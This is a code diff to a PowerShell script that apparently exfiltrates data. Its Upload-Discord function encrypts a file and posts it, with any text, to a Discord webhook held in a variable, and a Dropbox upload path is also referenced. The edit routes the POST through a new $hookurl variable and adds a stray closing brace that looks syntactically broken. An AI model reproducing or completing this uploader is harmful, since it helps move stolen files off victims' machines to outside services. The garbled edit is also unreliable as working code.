@@ -510,7 +510,7 @@ if (-not ([string]::IsNullOrEmpty($db))){dropbox}
 function Upload-Discord {
     [CmdletBinding()]
     param (
-        [parameter(Position=0, Mandatory=$True)]
+        [parameter(Position=0, Mandatory=$False)]
         [string]$file,
         
         [parameter(Position=1, Mandatory=$True)]
@@ -529,6 +529,8 @@ function Upload-Discord {
     # Convert the Base64 key and IV into byte arrays
     $key = [System.Convert]::FromBase64String($keyBase64)
     $iv = [System.Convert]::FromBase64String($ivBase64)
+
+    $hookurl = "$dc"
 
     # Initialize the request body for the webhook
     $Body = @{
@@ -555,7 +557,7 @@ function Upload-Discord {
 
     # Send text content if provided
     if (-not ([string]::IsNullOrEmpty($text))) {
-        Invoke-RestMethod -ContentType 'Application/Json' -Uri $dc -Method Post -Body ($Body | ConvertTo-Json)
+        Invoke-RestMethod -ContentType 'Application/Json' -Uri $hookurl  -Method Post -Body ($Body | ConvertTo-Json)};
     }
 
     # Send the encrypted file if it exists
